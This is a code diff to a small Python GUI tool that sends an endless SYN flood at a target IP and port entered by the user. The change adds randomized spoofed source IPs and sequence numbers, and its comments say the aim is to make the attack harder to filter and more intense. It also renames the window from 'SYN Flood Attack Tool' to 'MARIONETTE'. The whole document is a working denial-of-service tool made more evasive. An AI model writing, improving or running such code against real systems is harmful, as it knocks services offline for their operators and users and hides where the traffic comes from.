@@ -1,13 +1,21 @@
 import tkinter as tk
 from scapy.all import *
 import threading
+import random
+import time
 
 def syn_flood(target_ip, target_port):
-    ip = IP(dst=target_ip)
-    syn = TCP(dport=target_port, flags="S", seq=1000)
-    pkt = ip/syn
     while True:
-        send(pkt, verbose=0)  # Send SYN packets continuously
+        # Randomizing source IP and sequence number to make the attack harder to filter
+        src_ip = ".".join(str(random.randint(0, 255)) for _ in range(4))  # Random source IP
+        seq_num = random.randint(1000, 9000)  # Random sequence number
+        ip = IP(src=src_ip, dst=target_ip)  # Set the random source IP and target IP
+        syn = TCP(dport=target_port, flags="S", seq=seq_num)
+        pkt = ip/syn
+        send(pkt, verbose=0)  # Send SYN packet
+
+        # Send packets as fast as possible to increase intensity
+        time.sleep(0.001)  # Adjust the sleep time to control attack speed
 
 def start_attack():
     target_ip = ip_entry.get()
@@ -19,7 +27,7 @@ def start_attack():
 
 # Set up the GUI window
 window = tk.Tk()
-window.title("SYN Flood Attack Tool")
+window.title("MARIONETTE")
 window.geometry("400x200")
 
 # Add labels and entry fields
